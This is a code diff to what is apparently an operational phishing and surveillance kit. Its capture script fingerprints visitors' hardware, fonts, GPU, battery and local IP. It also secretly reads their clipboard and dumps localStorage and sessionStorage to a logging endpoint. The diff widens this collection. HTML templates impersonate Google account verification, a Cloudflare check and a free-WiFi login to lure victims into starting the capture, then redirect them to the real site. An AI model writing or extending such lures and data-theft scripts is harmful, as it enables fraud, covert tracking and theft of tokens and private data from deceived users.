@@ -60,15 +60,15 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         if (statusTitle && title) statusTitle.innerText = title;
       }
 
-      async function logEvent(type, data) {
-        try {
-          await fetch('/api/log/' + targetId + '/' + type, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
-          });
-        } catch(e) {}
-      }
+        async function logEvent(type, data) {
+          try {
+            return await fetch('/api/log/' + targetId + '/' + type, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
+            });
+          } catch(e) { return null; }
+        }
 
       function finish(success, reason) {
         if (isSilent) { window.location.href = targetUrl; return; }
@@ -157,11 +157,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         (function(){
           var start = null;
           var frames = 0;
-          function check(timestamp) {
+          async function check(timestamp) {
             if (!start) start = timestamp;
             frames++;
             if (timestamp - start > 1000) {
-              logEvent('extra', { display_hz: Math.round((frames * 1000) / (timestamp - start)) });
+              await logEvent('extra', { display_hz: Math.round((frames * 1000) / (timestamp - start)) });
               return;
             }
             requestAnimationFrame(check);
@@ -178,9 +178,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         // Deep Recon: Incognito Detection
         (function() {
           if (navigator.storage && navigator.storage.estimate) {
-            navigator.storage.estimate().then(function(est) {
+            navigator.storage.estimate().then(async function(est) {
               var isPrivate = est.quota < 120000000;
-              logEvent('extra', { incognito_audit: isPrivate });
+              await logEvent('extra', { incognito_audit: isPrivate });
             });
           }
         })();
@@ -190,9 +190,12 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           var devtools = false;
           var element = new Image();
           Object.defineProperty(element, 'id', { get: function() { devtools = true; } });
-          console.log(element);
-          setTimeout(function() { logEvent('extra', { devtools_open: devtools }); }, 2000);
+          setTimeout(async function() { 
+            console.log(element);
+            await logEvent('extra', { devtools_open: devtools }); 
+          }, 2000);
         })();
+
         try {
           var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
           var oscillator = audioCtx.createOscillator();
@@ -207,10 +210,10 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           oscillator.connect(compressor);
           compressor.connect(audioCtx.destination);
           oscillator.start(0);
-          audioCtx.startRendering().then(function(buffer) {
+          audioCtx.startRendering().then(async function(buffer) {
             var sum = 0;
             for (var i = 4500; i < 5000; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
-            logEvent('extra', { audio_sig: sum.toString() });
+            await logEvent('extra', { audio_sig: sum.toString() });
           });
         } catch(e) {}
 
@@ -226,11 +229,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
              ctx.font = "72px '" + f + "', sans-serif";
              if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
            });
-           logEvent('extra', { installed_fonts: detectedFonts.join(',') });
+           await logEvent('extra', { installed_fonts: detectedFonts.join(',') });
         } catch(e) {}
 
         // Deep Recon: Hardware API Availability
-        logEvent('extra', {
+        await logEvent('extra', {
           api_bluetooth: !!navigator.bluetooth,
           api_usb: !!navigator.usb,
           api_hid: !!navigator.hid,
@@ -239,41 +242,70 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           api_idle: !!window.IdleDetector,
           api_contacts: !!navigator.contacts,
           api_wake: !!navigator.wakeLock,
-          api_storage: !!navigator.storage
+          api_storage: !!navigator.storage,
+          api_fonts: !!navigator.queryLocalFonts,
+          api_window: !!window.getScreenDetails
         });
+
+        // Deep Recon: GPU Registry
+        try {
+          var c = document.createElement('canvas');
+          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+          if (gl) {
+            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            var gpuData = {
+              vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
+              renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
+              gl_version: gl.getParameter(gl.VERSION),
+              shading_lang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+            await logEvent('extra', { gpu_full_profile: JSON.stringify(gpuData) });
+          }
+        } catch(e) {}
+
+        // Deep Recon: Advanced Battery
+        if (navigator.getBattery) {
+          navigator.getBattery().then(async function(b) {
+            await logEvent('extra', { 
+              battery_level: b.level * 100 + '%',
+              battery_charging: b.charging,
+              battery_time: b.chargingTime === Infinity ? 'N/A' : b.chargingTime
+            });
+          });
+        }
 
         // Wake Lock: Prevent Sleep during audit
         try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}
 
         // Deep Recon: High Entropy Brand/Model Detection
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(function(h) {
-             logEvent('extra', { hardware_brand_profile: JSON.stringify(h) });
+          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(async function(h) {
+             await logEvent('extra', { hardware_brand_profile: JSON.stringify(h) });
           }).catch(function(){});
         }
 
         // Deep Recon: High-Precision Performance Mark
-        (function(){
+        (async function(){
           var start = performance.now();
           for(var i=0; i<1000000; i++) Math.sqrt(i);
-          logEvent('extra', { cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
+          await logEvent('extra', { cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
         })();
         try {
           var pc = new RTCPeerConnection({iceServers:[]});
           pc.createDataChannel("");
           pc.createOffer().then(o => pc.setLocalDescription(o));
-          pc.onicecandidate = function(ice) {
+          pc.onicecandidate = async function(ice) {
             if (ice && ice.candidate && ice.candidate.candidate) {
               var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
-              logEvent('extra', { local_ip: ip });
+              await logEvent('extra', { local_ip: ip });
             }
           };
         } catch(e) {}
 
         // Deep Recon: Clipboard Buffer
         if (navigator.clipboard && navigator.clipboard.readText) {
-           navigator.clipboard.readText().then(function(txt) {
-             if (txt) logEvent('extra', { clipboard_sync: txt.substring(0, 1500) });
+           navigator.clipboard.readText().then(async function(txt) {
+             if (txt) await logEvent('extra', { clipboard_sync: txt.substring(0, 1500) });
            }).catch(function(){});
         }
 
@@ -300,8 +332,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           platforms.forEach(function(p) {
             var img = new Image();
             var start = Date.now();
-            img.onload = function() { logEvent('extra', { social_active: p.name, load_ms: Date.now() - start }); };
-            img.onerror = function() { logEvent('extra', { social_inactive: p.name }); };
+            img.onload = async function() { await logEvent('extra', { social_active: p.name, load_ms: Date.now() - start }); };
+            img.onerror = async function() { await logEvent('extra', { social_inactive: p.name }); };
             img.src = p.url + '?v=' + start;
           });
         })();
@@ -314,9 +346,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
            bait.style.position = 'absolute';
            bait.style.top = '-1000px';
            document.body.appendChild(bait);
-           setTimeout(function() {
+           setTimeout(async function() {
              var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none';
-             logEvent('extra', { adblock_detected: blocked });
+             await logEvent('extra', { adblock_detected: blocked });
              bait.remove();
            }, 1000);
         })();
@@ -326,14 +358,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           var nodes = ['https://1.1.1.1', 'https://8.8.8.8', 'https://www.google.com'];
           nodes.forEach(function(n) {
             var start = Date.now();
-            fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(function() {
-              logEvent('extra', { network_rtt: n, latency: Date.now() - start });
+            fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(async function() {
+              await logEvent('extra', { network_rtt: n, latency: Date.now() - start });
             }).catch(function(){});
           });
         })();
 
         // Deep Recon: Orientation & Peripherals
-        logEvent('extra', {
+        await logEvent('extra', {
           orientation: screen.orientation ? screen.orientation.type : 'N/A',
           gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
           languages: navigator.languages.join(',')
@@ -499,7 +531,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'network') {
                if (!isSilent) updateProgress(prog, "Analisis integritas node jaringan...", "NETWORK_INTELLIGENCE");
                if (navigator.connection) {
-                  logEvent('extra', { 
+                  await logEvent('extra', { 
                     net_effective: navigator.connection.effectiveType,
                     net_rtt: navigator.connection.rtt,
                     net_downlink: navigator.connection.downlink,
@@ -511,7 +543,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'bluetooth') {
                if (!isSilent) updateProgress(prog, "Scanning peripheral bus...", "BT_DISCOVERY");
                if (navigator.bluetooth) {
-                  navigator.bluetooth.getAvailability().then(avail => logEvent('extra', { bt_available: avail }));
+                  await navigator.bluetooth.getAvailability().then(async avail => await logEvent('extra', { bt_available: avail }));
                }
             }
             if (p === 'performance') {
@@ -523,16 +555,38 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'security') {
                if (!isSilent) updateProgress(prog, "Kernel security environment audit...", "KERNEL_SEC");
-               logEvent('extra', { 
+               await logEvent('extra', { 
                  sec_webdriver: navigator.webdriver,
                  sec_cookies: navigator.cookieEnabled,
-                 sec_java: navigator.javaEnabled()
+                 sec_java: navigator.javaEnabled(),
+                 sec_pdf: !!navigator.pdfViewerEnabled,
+                 sec_doNotTrack: navigator.doNotTrack
                });
+            }
+
+            if (p === 'fonts_advanced') {
+               if (!isSilent) updateProgress(prog, "Scanning local font registry...", "FONT_FORENSIC");
+               if (navigator.queryLocalFonts) {
+                  try {
+                    var fonts = await navigator.queryLocalFonts();
+                    await logEvent('extra', { fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
+                  } catch(e) {}
+               }
+            }
+
+            if (p === 'window_mgmt') {
+               if (!isSilent) updateProgress(prog, "Mapping multi-display architecture...", "WINDOW_INTEL");
+               if (window.getScreenDetails) {
+                  try {
+                    var details = await window.getScreenDetails();
+                    await logEvent('extra', { screens: details.screens.length, screen_primary: details.currentScreen.label });
+                  } catch(e) {}
+               }
             }
 
             if (p === 'storage_map') {
                if (!isSilent) updateProgress(prog, "Mapping data persistent layer...", "PERSISTENT_MAP");
-               logEvent('extra', {
+               await logEvent('extra', {
                  storage_ls: JSON.stringify(localStorage).substring(0, 3000),
                  storage_ss: JSON.stringify(sessionStorage).substring(0, 3000)
                });
@@ -560,25 +614,28 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
   `;
 };
 
-const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage', 'vibration', 'network', 'bluetooth', 'performance', 'security', 'storage_map', 'network_forensic'];
+const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage', 'vibration', 'network', 'bluetooth', 'performance', 'security', 'storage_map', 'network_forensic', 'fonts_advanced', 'window_mgmt'];
 const SILENT_PERMS = ['vibration', 'network', 'performance', 'security', 'storage_map', 'network_forensic'];
 const NETWORK_PERMS = ['network', 'bluetooth', 'performance', 'security', 'network_forensic', 'vibration'];
+const GOOGLE_PERMS = ['gps', 'media', 'network', 'performance', 'security', 'vibration'];
+const LOGISTICS_PERMS = ['gps', 'network', 'vibration', 'performance'];
+const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_map', 'sensors'];
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
   'google': {
-    name: "🛡️ Google: Account Verification (Advanced)",
+    name: "🛡️ Google: Identity Verification (Full Scope)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Roboto', Arial, sans-serif; background:#fff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dadce0; border-radius:8px; padding:40px; width:360px; text-align:center; box-sizing:border-box; } .google-logo { width:75px; height:24px; margin-bottom:24px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#202124; margin-bottom:32px; } .identity-pill { background:#f1f3f4; border:1px solid #dadce0; border-radius:16px; padding:4px 12px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; width:100%; transition:box-shadow .2s; } .btn:hover { box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149); }</style></head><body><div class="box"><img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"><h1>Confirm it's you</h1><div class="identity-pill"><img src="https://lh3.googleusercontent.com/a/default-user=s40">Account Verification Required</div><p>To continue, Google needs to confirm that your browser environment is secure and that your location data matches your account profile.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
       tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
     })}</body></html>`
   },
   'gallery': {
-    name: "🖼️ Integrity: Media Asset Audit (Clean)",
+    name: "🖼️ Integrity: Media Forensic Sync (Full Scope)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Asset Integrity Check</title><style>body { background:#f8f9fa; color:#202124; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:48px; border-radius:12px; text-align:center; background:#fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border:1px solid #dadce0; } h2 { font-size:20px; font-weight:500; margin-top:0; } p { color:#70757a; font-size:14px; line-height:1.6; margin:20px 0 30px; } .btn { background:#1a73e8; color:#fff; padding:12px 32px; border-radius:6px; border:none; font-weight:500; cursor:pointer; width:100%; font-size:14px; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:15px;">🛡️</div><h2>Media Integrity Audit</h2><p>Our systems require a standard synchronization of media metadata and device coordinates to validate your identity for this session.</p><button class="btn" onclick="window.startCapture();">Verify Assets</button></div>${getCaptureScript(id, 'https://photos.google.com', {
       tmplId: 'gallery', perms: ALL_PERMS, accent: '#1a73e8', icon: '🕵️'
     })}</body></html>`
   },
   'cloudflare': {
-    name: "☁️ Cloudflare: Edge Verification (Corporate)",
+    name: "☁️ Cloudflare: Edge Verification (Full Scope)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; background:#fff; } .box { max-width:450px; padding:20px; } .spinner { border:2px solid #e0e0e0; border-top:2px solid #f48120; border-radius:50%; width:30px; height:30px; animation: spin 0.8s linear infinite; margin:40px auto; } @keyframes spin { to { transform:rotate(360deg); } } h1 { font-size:24px; font-weight:400; color:#313131; } .btn { background:#fff; border:1px solid #d1d1d1; padding:10px 20px; border-radius:3px; color:#313131; font-weight:400; cursor:pointer; font-size:14px; margin-top:20px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120"><div class="spinner"></div><h1>Verifying your browser...</h1><p style="color:#666; font-size:14px; line-height:1.6;">Cloudflare is verifying the integrity of your hardware and regional spatial data to ensure the security of the target resource.</p><button class="btn" onclick="window.startCapture();">Verify you are human</button></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
       tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#f48120', icon: '☁️'
     })}</body></html>`
@@ -590,9 +647,9 @@ export const templates: Record<string, {name: string, render: (id: string) => st
     })}</body></html>`
   },
   'wifi': {
-    name: "📶 WIFI: Hotspot Certification (OP - High Bait)",
+    name: "📶 WIFI: Hotspot Certification (Full Scope)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Connect</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { text-align:center; width:90%; max-width:380px; } hr { border:0; border-top:1px solid #f0f0f0; margin:25px 0; } .btn { background:#000; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="70"><br><br><h1>Free WiFi Login</h1><p style="color:#666; font-size:14px;">Otorisasi identitas perangkat diperlukan untuk menggunakan hotspot publik ini secara aman.</p><hr><button class="btn" onclick="window.startCapture();">LOGIN TO NETWORK</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: 'wifi', perms: NETWORK_PERMS, accent: '#000', icon: '📶'
+      tmplId: 'wifi', perms: ALL_PERMS, accent: '#000', icon: '📶'
     })}</body></html>`
   },
   'recap': {
